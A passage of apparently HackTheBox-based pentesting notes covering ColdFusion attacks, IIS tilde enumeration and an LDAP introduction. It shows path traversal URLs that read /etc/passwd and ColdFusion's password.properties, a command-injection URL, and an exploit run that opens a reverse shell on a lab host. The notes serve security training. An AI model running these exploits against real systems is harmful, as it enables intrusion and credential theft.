+<tr><td>Developing data-driven web applications</td><td>ColdFusion allows developers to build rich, responsive web apps easily. It offers session management, form handling, debugging, and more features. ColdFusion allows you to leverage your existing knowledge of the language and combines it with advanced features to help you build robust web apps quickly.</td></tr>
+<tr><td>Integrating with databases</td><td>ColdFusion easily integrates with databases such as Oracle, SQL Server, and MySQL. ColdFusion provides advanced database connectivity and is designed to make it easy to retrieve, manipulate, and view data from a database and the web.</td></tr>
+<tr><td>Simplifying web content management</td><td>One of the primary goals of ColdFusion is to streamline web content management. The platform offers dynamic HTML generation and simplifies form creation, URL retrieving, file uploading, and handling of large forms. Furthermore, ColdFusion also supports AJAX by automatically handling the serialisation and deserialisation of AJAX-enabled components.</td></tr>
+<tr><td>Performance</td><td>ColdFusion is designed to be highly performant and is optimised for low latency and high throughput. It can handle a large number of simultaneous requests while maintaining a high level of perfomance.</td></tr>
+<tr><td>Collaboration</td><td>ColdFusion offers features that allow developers to work together on projects in real-time. This includes code sharing, debugging, version control, and more. This allows for faster and more efficient development reduce time-to-market and quicker delivery of projects.</td></tr>
+</tbody></table>
+</div>
+<p>Like any web-facing technology, ColdFusion has historically been vulnerable to various types of attacks, such as SQL injection, XSS, directory traversal, authentication bypass, and arbitrary file uploads. To improve the security of ColdFusion, developers must implement secure coding practices, input validation checks, and properly configure web servers and firewalls. Here are a few known vulns of ColdFusion:</p>
+<ol>
+<li>CVE-2021-21087: Arbitrary disallow of uploading JSP source code</li>
+<li>CVE-2020-24453: AD integration misconfiguration</li>
+<li>CVE-2020-24450: Command injection vuln</li>
+<li>CVE-2020-24449: Arbitrary file reading vuln</li>
+<li>CVE-2019-15909: XSS vuln</li>
+</ol>
+<p>ColdFusion exposes a fair few ports by default:</p>
+<div class="table-wrapper"><table><thead><tr><th>Port Number</th><th>Protocol</th><th>Description</th></tr></thead><tbody>
+<tr><td>80</td><td>HTTP</td><td>Used for non-secure HTTP communication between the web server and web browser.</td></tr>
+<tr><td>443</td><td>HTTPS</td><td>Used for secure HTTP communication between web server and web browser. Encrypts the communication between the web server and web browser.</td></tr>
+<tr><td>1935</td><td>RPC</td><td>Used for client-server communication. RPC allows a program to request information from another program on a different network device.</td></tr>
+<tr><td>25</td><td>SMTP</td><td>SMTP is used for sending email messages.</td></tr>
+<tr><td>8500</td><td>SSL</td><td>Used for server communication via SSL.</td></tr>
+<tr><td>5500</td><td>Server Monitor</td><td>Used for remote administration of the ColdFusion server.</td></tr>
+</tbody></table>
+</div>
+<p>Default ports can be changed during installation or configuration.</p>
+<h3 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h3>
+<p>During a pentesting enumeration, several ways to exist to identify whether a web app uses ColdFusion. Here are some methods that can be used:</p>
+<div class="table-wrapper"><table><thead><tr><th>Method</th><th>Description</th></tr></thead><tbody>
+<tr><td>Port Scanning</td><td>ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.</td></tr>
+<tr><td>File Extensions</td><td>ColdFusion typically uses <code>.cfm</code> or <code>.cfc</code> file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.</td></tr>
+<tr><td>HTTP Headers</td><td>Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.</td></tr>
+<tr><td>Error Message</td><td>If the app uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.</td></tr>
+<tr><td>Default Files</td><td>ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web app runs on ColdFusion.</td></tr>
+</tbody></table>
+</div>
+<pre><code class="language-bash">d41y@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 11:45 GMT
+Nmap scan report for 10.129.247.30
+Host is up (0.028s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+8500/tcp  open  fmtp
+49154/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 350.38 seconds
+</code></pre>
+<p>The port scan results shown three open ports. Two Windows RPC services, and one running on 8500. As you know, 8500 is a default port that ColdFusion uses for SSL. Navigating to the IP:8500 lists 2 dirs, CFIDE and cfdocs, in the root, further indicating that ColdFusion is running on port 8500.</p>
+<p>Navigating around the structures a bit shows lots of interesting info, from files with a clear .cfm extension to error messages and login pages.</p>
+<p><img src="../../../images/attacking_coldfusion1.png" alt="attacking cold fusion 1" /></p>
+<p><img src="../../../images/attacking_coldfusion2.png" alt="attacking cold fusion 2" /></p>
+<p><img src="../../../images/attacking_coldfusion3.png" alt="attacking cold fusion 3" /></p>
+<p>The <code>/CFIDE/administrator</code> path, however, loads the ColdFusion 8 Administrator login page. Now you know for certain that ColdFusion 8 is running on the server.</p>
+<p><img src="../../../images/attacking_coldfusion4.png" alt="attacking cold fusion 4" /></p>
+<h3 id="attacking-coldfusion"><a class="header" href="#attacking-coldfusion">Attacking ColdFusion</a></h3>
+<pre><code class="language-bash">d41y@htb[/htb]$ searchsploit adobe coldfusion
+
+------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                            |  Path
+------------------------------------------------------------------------------------------ ---------------------------------
+Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
+Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
+Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
+Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
+Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
+Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
+Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
+Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
+Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
+Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
+Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
+Adobe ColdFusion &lt; 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
+Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
+Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
+Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
+------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>As you know, the version of ColdFusion running is ColdFusion 8, and there are two results of interest. The Adobe ColdFusion - Directory Traversal and the Adobe ColdFusion 8 - Remote Command Execution results.</p>
+<h4 id="directory-traversal"><a class="header" href="#directory-traversal">Directory Traversal</a></h4>
+<p>Directory/Path Traversal is an attack that allows an attacker to access files and directories outside of the intended directory in a web app. The attack exploits the lack of input validation in a web application and can be executed through various input fields such as URL parameters, from fields, cookies, and more. By manipulating input parameters, the attacker can traverse the directory structure of the web app and access sensitive files, including configuration files, user data, and other system files. The attack can be executed by manipulating the input parameters in ColdFusion tags such as CFFile and CFDIRECTORY, which are used for file and directory operations such as uploading, downloading, and listing files.</p>
+<p>Take the following ColdFusion code snippet:</p>
+<pre><code class="language-html">&lt;cfdirectory directory="#ExpandPath('uploads/')#" name="fileList"&gt;
+&lt;cfloop query="fileList"&gt;
+    &lt;a href="uploads/#fileList.name#"&gt;#fileList.name#&lt;/a&gt;&lt;br&gt;
+&lt;/cfloop&gt;
+</code></pre>
+<p>In this code snippet, the ColdFusion cfdirectory tag lists the contents of the uploads directory, and the cfloop tag is used to loop through the query results and display the filenames as clickable links in HTML.</p>
+<p>However, the directory parameter is not validated correctly, which makes the application vulnerable to a Path Traversal attack. An attacker can exploit this vuln by manipulating the directory parameter to access files outside the uploads directory.</p>
+<pre><code>http://example.com/index.cfm?directory=../../../etc/&amp;file=passwd
+</code></pre>
+<p>In this example, the <code>../</code> sequence is used to navigate the directory tree and access the <code>/etc/passwd</code> file outside the intended location.</p>
+<p>CVE-2010-2861 is the Adobe ColdFusion - Directory Traversal exploit discovered by searchsploit. It is a vuln in ColdFusion that allows an attacker to conduct path traversal attacks.</p>
+<ul>
+<li>CFIDE/administrator/settings/mappings.cfm</li>
+<li>logging/settings.cfm</li>
+<li>datasources/index.cfm</li>
+<li>j2eepackaging/editarchive.cfm</li>
+<li>CFIDE/administrator/enter.cfm</li>
+</ul>
+<p>These ColdFusion files are vulnerable to a directory traversal attack in Adobe ColdFusion 9.0.1 and earlier versions. Remote attackers can exploit this vuln to read arbitrary files by manipulating the locale parameter in these specific ColdFusion files.</p>
+<p>With this vuln, attackers can access files outside the intended directory by including <code>../</code> sequences in the file parameter. For exmaple, consider the following URL:</p>
+<pre><code>http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
+</code></pre>
+<p>In this example, the URL attempts to access the mappings.cfm file in the /CFIDE/administrator/settings/ directory of the web application with a specified en locale. However, a directory traversal can be executed by manipulating the URL's locale parameter, allowing an attacker to read arbitrary files located outside of the intended directory, such as configuration files or system files.</p>
+<pre><code>http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
+</code></pre>
+<p>In this example, the <code>../</code> sequences have been used to replace a valid locale to traverse the directory structure and access the passwd file located in the <code>/etc/</code> directory.</p>
+<p>Using searchsploit, copy the exploit to a working directory and then execute the file to see what arguments it requires.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ searchsploit -p 14641
+
+  Exploit: Adobe ColdFusion - Directory Traversal
+      URL: https://www.exploit-db.com/exploits/14641
+     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
+File Type: Python script, ASCII text executable
+
+Copied EDB-ID #14641's path to the clipboard
+
+d41y@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
+d41y@htb[/htb]$ python2 14641.py 
+
+usage: 14641.py &lt;host&gt; &lt;port&gt; &lt;file_path&gt;
+example: 14641.py localhost 80 ../../../../../../../lib/password.properties
+if successful, the file will be printed
+</code></pre>
+<p>The password.properties file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses. It contains a list of key-value pairs, where the key represents the resource name and the value is the encrypted password. These encrypted passwords are used for services like database connections, mail servers, LDAP servers, and other resources that require authentication. By storing encrypted passwords in this file, ColdFusion can automatically retrieve them and use them to authenticate with the respective services without requiring the manual entry of passwords each time. The file is usually in the <code>[cf_root]/lib</code> directory and can be managed through the ColdFusion Administrator.</p>
+<p>By providing the correct parameters to the exploit script and specifying the path of the desired file, the script can trigger an exploit on the vulnerable endpoints mentioned above. The script will then output the result of the exploit attempt:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
+
+------------------------------
+trying /CFIDE/wizards/common/_logintowizard.cfm
+title from server in /CFIDE/wizards/common/_logintowizard.cfm:
+------------------------------
+#Wed Mar 22 20:53:51 EET 2017
+rdspassword=0IA/F[[E&gt;[$_6&amp; \\Q&gt;[K\=XP  \n
+password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+encrypted=true
+------------------------------
+...
+</code></pre>
+<p>As you can see, the contents of the password.properties file have been retrieved, proving that this target is vulnerable to CVE-2010-2861.</p>
+<h4 id="unauthenticated-rce"><a class="header" href="#unauthenticated-rce">Unauthenticated RCE</a></h4>
+<p>In the context of ColdFusion web applications, an unauthenticated RCE attack occurs when an attacker can execute arbitrary code on the server without requiring any authentication. This can happen when a web application allows the execution of arbitrary code through a feature or function that does not require authentication, such as a debugging console or a file upload functionality. Take the following code:</p>
+<pre><code class="language-html">&lt;cfset cmd = "#cgi.query_string#"&gt;
+&lt;cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5"&gt;
+</code></pre>
+<p>In the above code, the cmd variable is created by concatenating the cgi.query_string variable with a command to be executed. This command is then executed using the cfexecute function, which runs the Windows cmd.exe program with the specified arguments. This code is vulnerable to an unauthenticated RCE attack because it does not properly validate the cmd variable before executing it, nor does it require the user to be authenticated. An attacker could simply pass a malicious command as the cgi.query_string variable, and it would be executed by the server.</p>
+<pre><code># Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" &gt; C:\compromise.txt
+
+http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
+</code></pre>
+<p>This URL includes a semicolon at the beginning of the query string, which can allow for the execution of multiple commands on the server. This could potentially append legitimate functionality with an unintended command. The included echo command prints a message to the console, and is followed by a redirection command to write a file to the <code>C:</code> directory with a message indicating that the server has been compromised.</p>
+<p>An example of a ColdFusion unauthenticated RCE attack is the CVE-2009-2265 vuln that affected Adobe ColdFusion versions 8.0.1 and earlier. This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host. The vuln exists in the FCKeditor package, and is accessible on the following path:</p>
+<pre><code>http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=
+</code></pre>
+<p>CVE-2009-2265 is the vuln identified by your earlier searchsploit search as Adobe ColdFusion 8 - RCE. Pull it into a working directory.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ searchsploit -p 50057
+
+  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
+      URL: https://www.exploit-db.com/exploits/50057
+     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
+File Type: Python script, ASCII text executable
+
+Copied EDB-ID #50057's path to the clipboard
+
+d41y@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+</code></pre>
+<p>A quick cat review of the code indicates that the script needs some information. Set the correct information and launch the exploit.</p>
+<pre><code class="language-python">if __name__ == '__main__':
+    # Define some information
+    lhost = '10.10.14.55' # HTB VPN IP
+    lport = 4444 # A port not in use on localhost
+    rhost = "10.129.247.30" # Target IP
+    rport = 8500 # Target Port
+    filename = uuid.uuid4().hex
+</code></pre>
+<p>The exploit will take a bit of time to launch, but it eventually will return a functional remote shell.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ python3 50057.py 
+
+Generating a payload...
+Payload size: 1497 bytes
+Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp
+
+Priting request...
+Content-type: multipart/form-data; boundary=77c732cb2f394ea79c71d42d50274368
+Content-length: 1698
+
+--77c732cb2f394ea79c71d42d50274368
+
+&lt;SNIP&gt;
+
+--77c732cb2f394ea79c71d42d50274368--
+
+
+Sending request and printing response...
+
+
+		&lt;script type="text/javascript"&gt;
+			window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt", "1269fd7bd2b341fab6751ec31bbfb610.txt", "0" );
+		&lt;/script&gt;
+	
+
+Printing some information for debugging...
+lhost: 10.10.14.55
+lport: 4444
+rhost: 10.129.247.30
+rport: 8500
+payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp
+
+Deleting the payload...
+
+Listening for connection...
+
+Executing the payload...
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.129.247.30.
+Ncat: Connection from 10.129.247.30:49866.
+</code></pre>
+<p>Reverse shell:</p>
+<pre><code>Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\ColdFusion8\runtime\bin&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5C03-76A8
+
+ Directory of C:\ColdFusion8\runtime\bin
+
+22/03/2017  08:53 ��    &lt;DIR&gt;          .
+22/03/2017  08:53 ��    &lt;DIR&gt;          ..
+18/03/2008  11:11 ��            64.512 java2wsdl.exe
+19/01/2008  09:59 ��         2.629.632 jikes.exe
+18/03/2008  11:11 ��            64.512 jrun.exe
+18/03/2008  11:11 ��            71.680 jrunsvc.exe
+18/03/2008  11:11 ��             5.120 jrunsvcmsg.dll
+18/03/2008  11:11 ��            64.512 jspc.exe
+22/03/2017  08:53 ��             1.804 jvm.config
+18/03/2008  11:11 ��            64.512 migrate.exe
+18/03/2008  11:11 ��            34.816 portscan.dll
+18/03/2008  11:11 ��            64.512 sniffer.exe
+18/03/2008  11:11 ��            78.848 WindowsLogin.dll
+18/03/2008  11:11 ��            64.512 wsconfig.exe
+22/03/2017  08:53 ��             1.013 wsconfig_jvm.config
+18/03/2008  11:11 ��            64.512 wsdl2java.exe
+18/03/2008  11:11 ��            64.512 xmlscript.exe
+              15 File(s)      3.339.009 bytes
+               2 Dir(s)   1.432.776.704 bytes free
+</code></pre>
+<h2 id="iis-tilde-enumeration"><a class="header" href="#iis-tilde-enumeration">IIS Tilde Enumeration</a></h2>
+<p>IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names on some versions of Microsoft Internet Information Services web servers. This method takes advantage of a specific vuln in IIS, resulting from how it manages short file names within its directories.</p>
+<p>When a file or folder is created on an IIS server, Windows generates a short file name in the 8.3 format, consisting of eight chars for the file name, a period, and three chars for the extension. Intriguingly, these short file names can grant access to their corresponding files and folders, even if they were meant to be hidden or inaccessible.</p>
+<p>The tilde char, followed by a sequence number, signifies a short file name in a URL. Hence, if someone determines a file or folder's short file name, they can exploit the tilde char and the short file name in the URL to access sensitive data or hidden resources.</p>
+<p>IIS tilde directory enumeration primarily involves sending HTTP requests to the server with distinct char combinations in the URL to identify valid short file names. Once a valid short file name is detected, this information can be utilised to access the relevant resource or further enumerate the directory structure.</p>
+<p>The enumeration process starts by sending requests with various chars following the tilde:</p>
+<pre><code>http://example.com/~a
+http://example.com/~b
+http://example.com/~c
+...
+</code></pre>
+<p>Assume the server contains a hidden directory named SecretDocuments. When a request is sent to <code>http://example.com/~s</code>, the server replies with a <code>200 OK</code> status code, revealing a directory with a short name beginning with "s". The enumeration process continues by appending more chars:</p>
+<pre><code>http://example.com/~se
+http://example.com/~sf
+http://example.com/~sg
+...
+</code></pre>
+<p>For the request <code>http://example.com/~se</code>, the server returns a <code>200 OK</code> status code, further refining the short name to be "se". Further requests are sent such as:</p>
+<pre><code>http://example.com/~sec
+http://example.com/~sed
+http://example.com/~see
+...
+</code></pre>
+<p>The server delivers a <code>200 OK</code> status code for the request <code>http://example.com/~sec</code>, further narrowing the short name to "sec".</p>
+<p>Continuing this procedure, the short name <code>secret~1</code> is eventually discovered when the server returns a <code>200 OK</code> status code for the request <code>http://example.com/~secret</code>.</p>
+<p>Once the short name is identified, enumeration of specific file names within that path can be performed, potentially exposing sensitive documents.</p>
+<p>For instance, if the short name <code>secret~1</code> is determined for the concealed directory SecretDocuments, files in that dir can be accessed by submitting requests such as:</p>
+<pre><code>http://example.com/secret~1/somefile.txt
+http://example.com/secret~1/anotherfile.docx
+</code></pre>
+<p>The same IIS tilde directory enumeration technique can also detect 8.3 short file names for files within the directory. After obtaining the short names, those files can be directly accessed using the short names in the requests.</p>
+<pre><code>http://example.com/secret~1/somefi~1.txt
+</code></pre>
+<p>In 8.3 short file names, such as <code>somefi~1.txt</code>, the number "1" is a unique identifier that distinguishes files with similar names within the same directory. The numbers following the tilde assist the file system in differentiating between files that share similarities in their names, ensuring each file has a distinct 8.3 short file name.</p>
+<p>For example, if two files named somefile.txt and somefile1.txt exist in the same directory, their 8.3 short file names would be:</p>
+<ul>
+<li>somefi~1.txt for somefile.txt</li>
+<li>somefi~2.txt for somefile1.txt</li>
+</ul>
+<h3 id="enumeration-1"><a class="header" href="#enumeration-1">Enumeration</a></h3>
+<p>The initial phase involves mapping the target and determining which services are operating on their respective ports.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ nmap -p- -sV -sC --open 10.129.224.91
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 19:44 GMT
+Nmap scan report for 10.129.224.91
+Host is up (0.011s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Bounty
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds
+</code></pre>
+<p>IIS 7.5 is running on port 80. Executing a tilde enumeration attack on this version could be a viable option.</p>
+<h4 id="tilde-enumeration-using-iis-shortname-scanner"><a class="header" href="#tilde-enumeration-using-iis-shortname-scanner">Tilde Enumeration using IIS ShortName Scanner</a></h4>
+<p>Manually sending HTTP requests for each letter of the alphabet can be a tedious process. Fortunately, there is a tool called <a href="https://github.com/irsdl/IIS-ShortName-Scanner">IIS-ShortName-Scanner</a> that can automate this task. To use it, you will need to install Oracle Java.</p>
+<p>When you run the below command, it will prompt you for a proxy, just hit enter for "No".</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
+
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Do you want to use proxy [Y=Yes, Anything Else=No]? 
+# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
+Target: http://10.129.204.231/
+|_ Result: Vulnerable!
+|_ Used HTTP method: OPTIONS
+|_ Suffix (magic part): /~1/
+|_ Extra information:
+  |_ Number of sent requests: 553
+  |_ Identified directories: 2
+    |_ ASPNET~1
+    |_ UPLOAD~1
+  |_ Identified files: 3
+    |_ CSASPX~1.CS
+      |_ Actual extension = .CS
+    |_ CSASPX~1.CS??
+    |_ TRANSF~1.ASP
+</code></pre>
+<p>Upon executing the tool, it discovers 2 dirs and 3 files. However, the target does not permit GET access to <code>http://10.129.204.231/TRANSF~1.ASP</code>, necessitating the brute-forcing of the remaining filename.</p>
+<h4 id="generate-wordlist"><a class="header" href="#generate-wordlist">Generate Wordlist</a></h4>
+<pre><code class="language-bash">d41y@htb[/htb]$ egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' &gt; /tmp/list.txt
+</code></pre>
+<p>This command combines egrep and sed to filter and modify the contents of input files, then save the results to a new file.</p>
+<div class="table-wrapper"><table><thead><tr><th>Command Part</th><th>Description</th></tr></thead><tbody>
+<tr><td><code>egrep -r ^transf</code></td><td>The <code>egrep</code> command is used to search for lines containing a specific pattern in the input files. The <code>-r</code> flag indicates a recursive search through dirs. The <code>^transf</code> pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names.</td></tr>
+<tr><td><code>sed 's/ ^[^:]*://'</code></td><td>The <code>sed</code> command is used to perform a find-and-replace operation on its input. The <code>'s/ ^[^:]*://'</code> expression tells sed to find any sequence of chars at the beginning of a line up to the first colon, and replace them with nothing. The result will be the lines starting with "transf" but without the file names and colons.</td></tr>
+</tbody></table>
+</div>
+<h4 id="gobuster-enumeration"><a class="header" href="#gobuster-enumeration">Gobuster Enumeration</a></h4>
+<p>Once you have created the custom wordlist, you can use gobuster to enumerate all items in the target.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
+
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.204.231/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /tmp/list.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              asp,aspx
+[+] Timeout:                 10s
+===============================================================
+2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
+===============================================================
+/transf**.aspx        (Status: 200) [Size: 941]
+Progress: 306 / 309 (99.03%)
+===============================================================
+2023/03/23 15:14:11 Finished
+===============================================================
+</code></pre>
+<p>From the redacted output, you can see that Gobuster has successfully identified an .aspx file as the full filename corresponding to the previously discovered short name TRANS~1.ASP.</p>
+<h2 id="ldap"><a class="header" href="#ldap">LDAP</a></h2>
+<p>LDAP (<em>Lightweight Directory Access Protocol</em>) is a protocol used to access and manage directory information. A directory is a hierarchical data store that contains information about network resources such as users, groups, computers, printers, and other devices. LDAP provides some excellent funtionality:</p>
+<div class="table-wrapper"><table><thead><tr><th>Functionality</th><th>Description</th></tr></thead><tbody>
+<tr><td>Efficient</td><td>Efficient and fast queries and connections to directory services, thanks to its lean query language and non-normalised data storage.</td></tr>
+<tr><td>Global naming model</td><td>Supports multiple independent directories with a global naming model that ensures unique entries.</td></tr>
+<tr><td>Extensible and flexible</td><td>This helps to meet future and local requirements by allowing custom attributes and schemas.</td></tr>
+<tr><td>Compatibility</td><td>It is compatible with many software products and platforms as it runs over TCP/IP and SSL directly, and it is platform-independent, suitable for use in heterogeneous environments with various OS.</td></tr>
+<tr><td>Authentication</td><td>It provides authentication mechanisms that enable users to sign on once and access multiple resources on the server securely.</td></tr>
+</tbody></table>
+</div>
+<p>However, it suffers some significant issues:</p>
+<div class="table-wrapper"><table><thead><tr><th>Functionality</th><th>Description</th></tr></thead><tbody>
+<tr><td>Compliance</td><td>Directory servers must be LDAP compliant for service to be deployed, which may limit the choice of vendors and products.</td></tr>
+<tr><td>Complexity</td><td>Difficult to use and understand for many developers and administrators, who may not know how to configure LDAP clients correctly or use it securely.</td></tr>
+<tr><td>Encryption</td><td>LDAP does not encrypt its traffic by default, which exposes sensitive data to potential eavesdropping and tampering. LDAPS or StartTLS must be used to enable encryption.</td></tr>
+<tr><td>Injection</td><td>Vulnerable to LDAP injection attacks, where malicious users can manipulate LDAP queries and gain unauthorised access to data or resources. To prevent such attacks, input validation and output encoding must be implemented.</td></tr>
+</tbody></table>
+</div>
+<p>LDAP is commonly used for providing a central location for accessing and managing directory services. Directory services are collections of information about the organisation, its users, and assets-like usernames and passwords. LDAP enables organisations to store, manage, and secure this information in a standardised way. Some use cases are:</p>
+<div class="table-wrapper"><table><thead><tr><th>Use Case</th><th>Description</th></tr></thead><tbody>
+<tr><td>Authentication</td><td>LDAP can be used for central authentication, allowing users to have single login credentials across multiple applications and systems. This is one of the most common use cases for LDAP.</td></tr>
+<tr><td>Authorisation</td><td>LDAP can manage permissions and access control for network resources such as folders or files on a network share. However, this may require additional configuration or integration with protocols like Kerberos.</td></tr>
+<tr><td>Directory Services</td><td>LDAP provides a way to search, retrieve, and modify data stored in a directory, making it helpful for managing large numbers of users and devices in a corporate network. LDAP is based on the X.500 standard for directory services.</td></tr>
+<tr><td>Synchronisation</td><td>LDAP can be used to keep data consistent across multiple systems by replicating changes made in one directory to another.</td></tr>
+</tbody></table>
+</div>
+<p>There are two popular implementations of LDAP: OpenLDAP, an open-source software widely used and supported, and Microsoft AD, a Windows-based implementation that seamlessly integrates with other Microsoft products and services.</p>
+<p>Although LDAP and AD are related, they serve different purposes. LDAP is a protocol that specifies the method of accessing and modifying directory services, whereas AD is a directory service that stores and manages users and computer data. While LDAP can communicate with AD and other directory services, it is not a directory service itself. AD offers extra funtionalities such as policy administration, single sign-on, and integration with various Microsoft products.</p>
+<p>LDAP works by using a client-server architecture. A client sends an LDAP request to a server, which searches the directory service and returns a response to the client. LDAP is a protocol that is simpler and more efficient than X.500, on which it is based. It uses a client-server model, where clients send requests to servers using LDAP messages encoded in ASN.1 and transmitted over TCP/IP. The servers process the requests and send back responses using the same format. LDAP supports various requests, such as bind, unbind, search, compare, add, delete, modify, etc.</p>
+<p>LDAP requests are messages that clients send to servers to perform operations on data stored in a directory service. An LDAP request is comprised of several components:</p>
+<ol>
+<li><strong>Session connection</strong>: The client connects to the server via an LDAP port (<em>usually 389 or 636</em>)</li>
+<li><strong>Request type</strong>: The client specifies the operation it wants to perform, such as bind, search, etc.</li>
+<li><strong>Request parameters</strong>: The client provides additional information for the request, such as the distinguished name of the entry to be accessed or modified, the scope and filter of the search query, the attributes and values to be added or changed, etc.</li>
+<li><strong>Request ID</strong>: The client assigns a unique identifier for each request to match it with the corresponding response from the server.</li>
+</ol>
+<p>Once the server receives the request, it processes it and sends back a response message that includes several components:</p>
+<ol>
+<li><strong>Response type</strong>: The server indicates the operation that was performed in response to the request.</li>
+<li><strong>Result code</strong>: The server indicates whether or not the operation was successful and why.</li>
+<li><strong>Matched DN</strong>: If applicable, the server returns the DN of the closest existing entry that matches the request.</li>
+<li><strong>Referral</strong>: The server returns a URL of another server that may have more information about the request, if applicable.</li>
+<li><strong>Response data</strong>: The server returns any additional data related to the response, such as the attributes and values of an entry that was searched or modified.</li>
+</ol>
+<p>After receiving and processing the response, the client disconnects from the LDAP port.</p>
+<h3 id="ldapsearch"><a class="header" href="#ldapsearch">ldapsearch</a></h3>
